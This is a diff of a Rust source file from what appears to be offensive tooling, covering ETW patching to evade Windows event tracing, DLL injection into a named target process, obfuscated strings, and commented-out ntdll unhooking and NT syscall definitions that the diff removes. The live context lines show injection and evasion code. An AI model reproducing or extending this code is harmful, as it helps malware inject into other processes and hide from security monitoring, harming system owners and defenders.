@@ -42,46 +42,7 @@ use export_resolver::ExportList;
 
 use obfuse::obfuse;
 
-use crate::parse_pe::PeParser;
-
-// type NtOpenProcessFn = unsafe extern "system" fn(
-//     ProcessHandle: *mut HANDLE,
-//     DesiredAccess: u32,
-//     ObjectAttributes: *const (),
-//     ClientId: *const (),
-// ) -> i32;
-
-// type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
-//     ProcessHandle: HANDLE,
-//     BaseAddress: *mut *mut std::ffi::c_void,
-//     ZeroBits: usize,
-//     RegionSize: *mut usize,
-//     AllocationType: u32,
-//     Protect: u32,
-// ) -> i32;
-
-// type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
-//     ProcessHandle: HANDLE,
-//     BaseAddress: *mut std::ffi::c_void,
-//     Buffer: *const std::ffi::c_void,
-//     NumberOfBytesToWrite: usize,
-//     NumberOfBytesWritten: *mut usize,
-// ) -> i32;
-
-// type NtCreateThreadExFn = unsafe extern "system" fn(
-//     ThreadHandle: *mut HANDLE,
-//     DesiredAccess: u32,
-//     ObjectAttributes: *const (),
-//     ProcessHandle: HANDLE,
-//     StartAddress: *mut std::ffi::c_void,
-//     Parameter: *mut std::ffi::c_void,
-//     CreateSuspended: i32,
-//     StackZeroBits: usize,
-//     SizeOfStackCommit: usize,
-//     SizeOfStackReserve: usize,
-//     lpBytesBuffer: *mut std::ffi::c_void,
-// ) -> i32;
-
+use crate::parse_pe::PeFileParser;
 
 
 
@@ -107,8 +68,6 @@ pub fn patch_etw() -> Result<(), anyhow::Error>
 
     let res = unsafe {
 
-        // let nt_write_virtual_memory: NtWriteVirtualMemoryFn = std::mem::transmute(NT_WRITE_VIRTUAL_MEMORY_ADDR.get().expect("[ERROR] NT_WRITE_VIRTUAL_MEMORY_ADDR not initialized."));
-
         zw_write_virtual_memory(
             handle,
             nt_trace_addr as *mut c_void,
@@ -129,53 +88,6 @@ pub fn patch_etw() -> Result<(), anyhow::Error>
     Ok(())
 
 }
-
-// fn ntdll_unhook() -> HMODULE {
-//     let obfused_ntdll = obfuse!("C:\\Windows\\System32\\ntdll.dll\0");
-//     let ntdll_str = obfused_ntdll.as_str();
-
-//     let file = unsafe {
-//         CreateFileA(
-//             PCSTR(ntdll_str.as_ptr()),
-//             GENERIC_READ,
-//             FILE_SHARE_READ,
-//             null_mut(),
-//             OPEN_EXISTING,
-//             FILE_ATTRIBUTE_NORMAL,
-//             std::ptr::null_mut(),
-//         )?
-//     };
-
-//     let mapping = unsafe {
-//         CreateFileMappingA(
-//             file,
-//             None,
-//             PAGE_READONLY | SEC_IMAGE,
-//             0,
-//             0,
-//             None,
-//         )?
-//     };
-
-//     let mapped = unsafe {
-//         MapViewOfFile(
-//             mapping,
-//             FILE_MAP_READ,
-//             0,
-//             0,
-//             0,
-//         )
-//     };
-
-//     unsafe {
-//         CloseHandle(file);
-//         CloseHandle(mapping);
-//     }
-
-//     let h_module = HMODULE(view.0 as _);
-
-
-// }
 
 
 
@@ -219,10 +131,7 @@ pub fn get_process_pid_by_name(target_name_wide: &[u16]) -> Option<u32> {
 }
 
 
-pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeParser, yolo: usize) -> anyhow::Result<()> {
-
-    // let pid = get_process_pid_by_name(target_name_wide)
-    //     .ok_or_else(|| anyhow::anyhow!("Process not found"))?;
+pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeFileParser, yolo: usize) -> anyhow::Result<()> {
 
     let pid = get_process_pid_by_name(target_name_wide)
         .ok_or_else( || anyhow::anyhow!("[ERROR] Process not found.") )?;
@@ -294,14 +203,6 @@ pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeParser, yolo
 
         let mut bytes_written: SIZE_T = 0;
 
-        // let nt_write_virtual_memory: NtWriteVirtualMemoryFn = std::mem::transmute(ntwritevirtualmemory_addr);
-        // let status = nt_write_virtual_memory(
-        //     process_handle,
-        //     base_address as *mut std::ffi::c_void,
-        //     dll_data.as_ptr() as *const std::ffi::c_void,
-        //     dll_data.len() as usize,
-        //     &mut bytes_written,
-        // );
 
         let status = zw_write_virtual_memory(
             process_handle, 
